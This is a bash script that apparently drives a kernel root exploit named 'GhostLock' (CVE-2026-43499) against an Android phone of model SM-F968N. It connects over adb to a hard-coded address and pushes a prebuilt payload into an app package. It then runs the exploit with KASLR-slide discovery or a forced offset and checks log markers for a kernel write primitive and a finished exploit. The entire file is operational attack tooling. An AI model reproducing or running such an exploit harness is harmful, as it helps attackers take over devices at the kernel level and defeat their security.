#!/bin/bash
# CVE-2026-43499 GhostLock — q7mq on-device test script
# Usage: ./test_q7mq.sh [natural|forced]
#   natural = let payload discover KASLR + verify write primitive via p0 oracle (slower, proves write works)
#   forced  = use cached SLIDE_P0_OFFSET=0x70000 (faster, skips oracle proof)

set -euo pipefail

MODE="${1:-natural}"
DEVICE="100.127.208.30:33907"
PAYLOAD="build/q7mq-F968NKSS6BZG3/cve-2026-43499-app.release.so"
HELPER_PATH="/data/app/~~TYe0tvIgaok-bgP9RjaNwg==/dev.busung.s25uroot-Lnxc0nZSvcIERlAoxWtdWg==/lib/arm64/libcve43499root.so"
APP_PKG="dev.busung.s25uroot"
LOG="/data/local/tmp/ghostlock_test.log"

echo "=== GhostLock q7mq test (mode=$MODE) ==="

# 1. Connect
echo "[*] Connecting to $DEVICE..."
adb connect "$DEVICE" || true
sleep 1
adb devices | grep -q "device$" || { echo "[-] No device connected"; exit 1; }

# 2. Verify device identity
MODEL=$(adb shell getprop ro.product.model | tr -d '\r')
echo "[*] Device: $MODEL"
[[ "$MODEL" == "SM-F968N" ]] || echo "[!] WARNING: unexpected model"

# 3. Kill orphan helpers
echo "[*] Killing orphan helpers..."
adb shell "pkill -9 -f cve43499" 2>/dev/null || true
sleep 1

# 4. Push payload
echo "[*] Pushing payload..."
adb push "$PAYLOAD" /data/local/tmp/payload_test.so
adb shell "run-as $APP_PKG cp /data/local/tmp/payload_test.so files/payload_test.so"

# 5. Set up environment
BOOT_ID=$(adb shell cat /proc/sys/kernel/random/boot_id | tr -d '\r')
echo "[*] boot_id=$BOOT_ID"

if [[ "$MODE" == "forced" ]]; then
  SLIDE_ENV="SLIDE_P0_OFFSET=0x70000"
  echo "[*] Using forced KASLR offset 0x70000 (skips p0 oracle proof)"
else
  SLIDE_ENV=""
  echo "[*] Natural KASLR discovery (p0 oracle will verify write primitive)"
fi

# 6. Run exploit via app helper
echo "[*] Running exploit..."
echo "[*] Log: $LOG"
adb shell "
  cd /data/local/tmp
  export CVE43499_ROOT_HELPER=$HELPER_PATH
  export EXPLOIT_ATTEMPTS=3
  export EXPLOIT_ATTEMPT_TIMEOUT_SEC=120
  $SLIDE_ENV
  run-as $APP_PKG $HELPER_PATH --run-payload files/payload_test.so $HELPER_PATH $LOG
" 2>&1 | tee /tmp/ghostlock_stdout.log

# 7. Pull and display log
echo ""
echo "=== Device log ==="
adb shell "cat $LOG" 2>/dev/null || echo "[-] No log file"

echo ""
echo "=== Key markers to check ==="
echo "  [+] slide-kaslr-ok          = KASLR leak succeeded"
echo "  [+] p0 physical elapsed_ms  = p0 oracle write primitive VERIFIED (non-circular)"
echo "  [+] p0 pipe gate hits=1     = write primitive confirmed via pipe oracle"
echo "  [+] cfi write ret=          = configfs trampoline working"
echo "  [+] exploit completed       = FULL SUCCESS"
echo "  [-] cfi misc_fops mismatch  = fops write did NOT land"
echo "  [-] p0 physical pipe gate   = write primitive FAILED"
